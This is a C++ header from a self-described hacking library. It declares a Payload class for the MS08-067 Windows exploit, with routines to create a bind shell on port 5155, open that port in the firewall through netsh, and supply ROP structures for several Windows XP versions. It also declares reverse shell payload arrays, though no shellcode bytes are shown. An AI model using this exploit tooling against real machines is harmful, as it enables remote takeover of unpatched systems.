/*
 * Hacking construction kit -- A GPL Windows security library.
 * While this library can potentially be used for nefarious purposes, 
 * it was written for educational and recreational
 * purposes only and the author does not endorse illegal use.
 *
 * This library is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 *
 * You should have received a copy of the GNU General Public License
 * along with this library.  If not, see <http://www.gnu.org/licenses/>.
 *
 * Author: thirdstormofcythraul@outlook.com
 */
#pragma once

// Payloads used with ms08-067
// thanks to metasploit
class Payload {
public:
	// Memory structure used in payload
	typedef struct Rop {
		unsigned char ret[4];
		unsigned char disablenx[4];
		unsigned char scratch[4];
	} tRop;

	// Create a bind shell on port 5155
	static unsigned char * createShellPayload(struct Payload::Rop rop);

	// Open firewall port 5155 (execute netsh add allowedport...)
	static unsigned char * createCmdPayload(struct Payload::Rop rop);

	// Get payload memory structure for windows 2000, windows xp sp1...
	static struct Payload::Rop ropsOthers[];

	// Get payload memory structure for windows xp SP2
	static struct Payload::Rop ropsXp2[];

	// Get payload memory structure for windows xp SP3
	static struct Payload::Rop ropsXp3[];
		
private:
	static unsigned char cmdpayload[];

	static unsigned char reverseShellPayload[];

	static unsigned char shellPayloadSp2[];

	static void showRop(unsigned char* payload);


};
